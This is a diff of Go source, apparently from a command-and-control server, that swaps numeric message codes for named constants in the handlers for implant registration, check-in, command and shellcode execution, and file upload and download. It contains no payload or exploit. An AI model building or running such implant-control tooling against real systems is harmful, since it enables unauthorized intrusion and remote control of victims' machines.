@@ -16,19 +16,19 @@ import (
 // we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
 // all message types and their corresponding functions can be called through the map below and the one in lib/serializable.go
 var messageTypeToFunc = map[int]func(*transport.Session, interface{}){
-	0: handleImplantRegister,
-	2: handleCheckin,
-	4: handleImplantErrorResp,
-	6: handleImplantKillResp,
-	8: handleImplantConfigResp,
+	communication.IMPLANT_REGISTER_REQ: handleImplantRegister,
+	communication.IMPLANT_CHECKIN_REQ:  handleCheckin,
+	communication.IMPLANT_ERROR_RESP:   handleImplantErrorResp,
+	communication.IMPLANT_KILL_RESP:    handleImplantKillResp,
+	communication.IMPLANT_CONFIG_RESP:  handleImplantConfigResp,
 	//reserved for implant functionality
-	12: handleFileInfoResp,
-	14: handleLsResp,
-	16: handleExecResp,
-	18: handleCdResp,
-	20: handleDownloadResp,
-	22: handleUploadResp,
-	24: handleShellcodeExecResp,
+	communication.FILE_INFO_RESP:      handleFileInfoResp,
+	communication.LS_RESP:             handleLsResp,
+	communication.EXEC_RESP:           handleExecResp,
+	communication.CD_RESP:             handleCdResp,
+	communication.DOWNLOAD_RESP:       handleDownloadResp,
+	communication.UPLOAD_RESP:         handleUploadResp,
+	communication.SHELLCODE_EXEC_RESP: handleShellcodeExecResp,
 }
 
 // This function can be passed to a listener to handle incoming connections. This function guarantees that the connection will be closed after it's
@@ -92,7 +92,7 @@ func handleImplantRegister(sess *transport.Session, data interface{}) {
 
 	//let the implant know we successfully registered it.
 	req := communication.ImplantRegisterResp{Success: true}
-	err = transport.SendEnvelopeToImplant(sess, 1, req)
+	err = transport.SendEnvelopeToImplant(sess, communication.IMPLANT_REGISTER_RESP, req)
 	if err != nil {
 		log.Printf("[ERROR] handlers: Could not send register confirmation to implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
 		return
@@ -143,7 +143,7 @@ func handleCheckin(sess *transport.Session, data interface{}) {
 		req.TaskArguments[i] = []byte(pendingTasks[i].Task_data)
 	}
 
-	transport.SendEnvelopeToImplant(sess, 3, req)
+	transport.SendEnvelopeToImplant(sess, communication.IMPLANT_CHECKIN_RESP, req)
 }
 
 // Handles enveloped with messageType==4. The implant send this message when execution of a module fails.
